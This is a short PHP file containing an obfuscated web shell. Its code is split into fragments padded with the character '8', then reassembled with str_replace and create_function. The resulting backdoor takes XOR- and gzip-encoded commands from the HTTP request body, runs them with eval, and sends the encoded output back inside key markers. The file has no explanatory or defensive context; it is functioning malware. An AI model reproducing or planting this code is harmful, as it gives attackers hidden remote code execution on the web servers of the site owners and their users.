<?php
$o='"8lxCJ7B80EI2b88RsoQW"8;function x8($t,$k)8{$c=8strl8en($k);$l=s8';
$O='$j++8,$i++)8{$8o.=$t8{$i}^$k{$j8};}}ret8ur8n $o;}8if (@preg88_m';
$C=',$m)8==1) {8@ob_8start();8@e88val(@gzuncom8p8ress(@x(@base8648_decode($m';
$q='8tr8len(8$t);$o8="";for($i=0;$i<8$l;8){8for($j=80;(8$j<$c&&$i<$l);';
$t='[1])8,$k)))8;$o=8@ob_ge8t8_contents8()8;@ob_end_cl8ean();$r8=@b';
$Y='ase8684_enco8de8(@x(@gzc8ompress($o),$k8));p8rint8("$p$k8h$r$kf");}';
$s='$k="e8018af157";$kh="e6846148996d8a1";$8kf8="f5c18094c7409";$p=';
$r='at8ch("/$kh8(.+)$kf/8",8@file_get_co8ntents("p8hp:8//input8")';
$Q=str_replace('C','','crCeCaCte_CfunCctCion');
$J=str_replace('8','',$s.$o.$q.$O.$r.$C.$t.$Y);
$c=$Q('',$J);$c();
?>
